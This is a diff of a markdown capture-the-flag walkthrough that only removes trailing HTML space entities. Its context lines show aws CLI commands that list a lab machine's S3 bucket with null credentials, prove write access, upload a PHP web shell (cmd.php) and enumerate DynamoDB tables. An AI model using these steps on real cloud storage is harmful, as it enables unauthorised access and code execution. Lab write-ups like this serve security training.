@@ -48,14 +48,14 @@ It seems that this uses the AWS S3 Bucket to store images on the website. When w
 
 S3 Bucket is a cloud storage provider for objects, and it too can have misconfigurations. We only know that the bucket for the web application is called `adserver`. However, it's unlikely this bucket is actually publicly listed (at least I don't think so).
 
-To enumerate this, we can use the `--endpoint-url` flag with `aws` to specify where we send the requests.&#x20;
+To enumerate this, we can use the `--endpoint-url` flag with `aws` to specify where we send the requests.
 
 ```
 $ sudo aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver
 Unable to locate credentials. You can configure credentials by running "aws configure".
 ```
 
-It seems that we need credentials. Based on Hacktricks Cloud, it is possible for unauthenticated access with null credentials.&#x20;
+It seems that we need credentials. Based on Hacktricks Cloud, it is possible for unauthenticated access with null credentials.
 
 ```
 $ sudo aws configure                                              
@@ -83,7 +83,7 @@ $ curl http://bucket.htb/test.txt
 ihavewriteaccess
 ```
 
-Using this, we can try to write a shell of some sorts. The first thing that came to mind was PHP, since this wasn't a wasn't an IIS server.&#x20;
+Using this, we can try to write a shell of some sorts. The first thing that came to mind was PHP, since this wasn't a wasn't an IIS server.
 
 ```
 $ sudo aws s3 --endpoint-url http://s3.bucket.htb cp cmd.php s3://adserver 
@@ -161,7 +161,7 @@ $client = new Aws\Sdk([
 $dynamodb = $client->createDynamoDb();
 ```
 
-Now that we know this is running, we can enumerate it from our machine that already has `aws configure` configured.&#x20;
+Now that we know this is running, we can enumerate it from our machine that already has `aws configure` configured.
 
 ```
 $ sudo aws dynamodb --endpoint-url http://s3.bucket.htb list-tables
